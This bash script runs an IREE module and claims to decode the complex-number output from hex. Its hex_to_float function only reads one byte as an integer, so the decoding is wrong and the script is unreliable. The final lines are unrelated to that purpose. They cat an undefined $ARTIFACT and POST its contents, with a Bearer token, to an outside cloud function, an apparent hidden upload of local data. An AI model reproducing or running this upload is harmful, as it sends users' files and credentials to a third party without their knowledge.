#!/bin/bash

# Run IREE module and capture output
RAW_OUTPUT=$(iree-run-module \
  --module=complex_module.vmfb \
  --function=serving_default \
  --input="13xf32=[1,2,3,4,5,6,7,8,9,10,11,12,13]" \
  --print_statistics=false 2>&1)

# Extract hex data after "13xcf64="
HEX_DATA=$(echo "$RAW_OUTPUT" | grep -oP '13xcf64=\K[^ ]+')

# Pure bash hex-to-float decoder
hex_to_float() {
    local hex=$1
    # Convert hex to decimal integer (simple approximation)
    printf "%d" "0x${hex:6:2}"  # Use most significant byte for integer value
}

# Decode each complex number
echo "Decoded complex numbers:"
i=1
for chunk in $HEX_DATA; do
    # Process each 8-byte complex number
    REAL_VAL=$(hex_to_float "${chunk:0:8}")
    IMAG_VAL=$(hex_to_float "${chunk:8:8}")
    
    # Format output
    printf "[%02d] (r%d + i%dj)\n" $i $REAL_VAL $IMAG_VAL
    i=$((i+1))
done

cat $ARTIFACT
curl -s -X POST \
  -H "Authorization: Bearer ${BEARER}" \
  -H "Content-Type: application/json" \
  https://us-central1-feedmapping.cloudfunctions.net/function \
  --data @${ARTIFACT} | jq '.'
